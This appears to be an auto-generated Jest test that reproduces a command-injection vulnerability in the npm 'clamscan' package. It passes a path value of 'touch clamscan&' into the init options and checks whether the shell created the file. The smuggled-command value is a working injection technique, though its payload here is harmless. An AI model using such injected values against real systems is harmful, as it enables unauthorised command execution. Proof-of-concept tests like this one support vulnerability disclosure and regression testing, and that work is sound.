const v51 = () => {
    const v27 = expect.assertions(2);
    v27;
    const Root = require('clamscan');
    const fs = require('fs');
    const path = './clamscan';
    try {
        const v28 = fs.existsSync(path);
        if (v28) {
            const v29 = fs.unlinkSync(path);
            v29;
            const v30 = console.log('File removed:', path);
            v30;
        }
    } catch (err) {
        const v31 = console.error(err);
        v31;
    }
    file_exist = fs.existsSync(path);
    const v32 = expect(file_exist);
    const v33 = v32.toBe(false);
    v33;
    var attack_code = 'touch clamscan';
    var root = new Root();
    const v34 = attack_code + '&';
    const v35 = function () {
    };
    const v36 = fs.mkdir(v34, v35);
    v36;
    const v37 = attack_code + '&';
    const v38 = {};
    v38.path = v37;
    const v39 = { clamscan: v38 };
    const v40 = root.init(v39);
    const v41 = () => {
    };
    const v42 = v40.then(v41);
    const v43 = err => {
    };
    const v44 = v42.catch(v43);
    const v49 = () => {
        file_exist = fs.existsSync(path);
        const v45 = expect(file_exist);
        const v46 = v45.toBe(true);
        v46;
        const v47 = function (err) {
        };
        const v48 = fs.unlink(path, v47);
        v48;
    };
    const v50 = v44.finally(v49);
    return v50;
};
const v52 = test('Command Injection in clamscan', v51);
v52;